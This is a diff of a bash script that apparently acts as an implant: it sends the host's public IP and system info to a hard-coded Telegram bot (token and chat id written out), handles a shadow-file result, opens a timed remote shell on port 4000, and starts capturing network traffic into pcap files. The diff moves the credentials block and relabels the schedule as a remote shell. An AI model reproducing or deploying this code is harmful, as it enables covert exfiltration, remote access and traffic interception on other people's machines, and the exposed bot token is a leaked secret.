@@ -2,6 +2,11 @@
 wget -q --spider http://google.com
 current_date=$(date "+%d-%m-%Y")
 if [ $? -eq 0 ]; then
+	# Send report via telegram
+	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
+	# chat id
+	chat_id="1789487661"
+
 	echo "Internet ok"
 	
 	# Installing dependencies
@@ -38,12 +43,8 @@ if [ $? -eq 0 ]; then
 	#f_port=3000
 	#echo "Enabling portforwarding on port $f_port..."
 	#iptables -A INPUT -p tcp --dport $f_port -j ACCEPT
-	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Port forwading enabled: $public_ip":"$f_port"		
+	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info %0APort forwading enabled: $public_ip":"$f_port"		
 
-	# Send report via telegram
-	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
-	# chat id
-	chat_id="1789487661"
 	filepath1=$nmap_output_file
 	filepath3=$ifconfig_output_file
 	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
@@ -60,7 +61,7 @@ if [ $? -eq 0 ]; then
 	rm "$result_shadow"
 	h=$(date +"%H:%M")
 	
-	#Schedule of 30 minutes
+	#Remote Shell enabled for 30 minutes
 	port=4000
 	start="14:00"
 	stop="14:30"
@@ -79,6 +80,7 @@ if [ $? -eq 0 ]; then
 		h=$(date +"%H:%M")
 		echo "Not listening..."
 	fi
+
 	echo "Start intercepting..."
 	# Max size of file .pcap
 	MAX_FILE_SIZE=200000000  # 200MB in byte
